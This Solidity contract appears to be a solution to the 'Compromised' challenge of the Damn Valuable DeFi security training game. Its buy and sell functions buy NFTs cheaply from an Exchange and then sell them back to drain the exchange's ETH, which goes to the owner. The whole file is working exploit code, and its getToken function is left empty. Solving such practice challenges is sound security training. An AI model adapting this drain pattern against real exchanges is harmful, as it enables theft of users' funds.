// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/Address.sol';
import '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';

import './Exchange.sol';
import '../DamnValuableNFT.sol';

/**
 * @title CompromisedAttacker
 * @author jb
 */
contract CompromisedAttacker is IERC721Receiver {
    using Address for address payable;
    using EnumerableSet for EnumerableSet.UintSet;

    address payable private _owner;
    mapping(address => EnumerableSet.UintSet) private _tokens;

    constructor() {
        _owner = payable(msg.sender);
    }

    // buy low!
    function attackSetup(
        Exchange target,
        uint256 qty,
        uint256 cost,
        bool force
    ) external payable {
        require(msg.value == cost * qty, 'need ETH');
        EnumerableSet.UintSet storage tokens = _tokens[address(target)];
        require(tokens.length() == 0 || force, 'already own');
        for (uint256 i; i < qty; ++i) {
            tokens.add(target.buyOne{value: cost}());
        }
    }

    // sell high!
    // amount = 0 to attempt entire balance
    function attackFinish(Exchange target, uint256 amount) external {
        amount == 0 ? _takeAll(target) : _takeSome(target, amount);
    }

    function _takeSome(Exchange target, uint256 amount) internal {
        EnumerableSet.UintSet storage tokens = _tokens[address(target)];
        uint256 length = tokens.length();
        require(length > 0, "don't own any");
        DamnValuableNFT NFT = DamnValuableNFT(target.token());
        uint256 weiBefore = address(this).balance;
        for (uint256 i; i < length; ++i) {
            // the set keeps getting reordered, so we keep taking from index 0
            uint256 token = tokens.at(0);
            tokens.remove(token);
            NFT.approve(address(target), token);
            target.sellOne(token);
        }
        uint256 earned = address(this).balance - weiBefore;
        require(earned >= amount, 'not enough');
        _owner.sendValue(earned);
    }

    function _takeAll(Exchange target) internal {
        _takeSome(target, address(target).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

    function getTokenCount(address target) external view returns (uint256) {
        return _tokens[target].length();
    }

    function getTokens(address target)
        external
        view
        returns (uint256[] memory)
    {
        return _tokens[target].values();
    }

    function getToken(address target, uint256 index)
        external
        view
        returns (uint256)
    {}
}
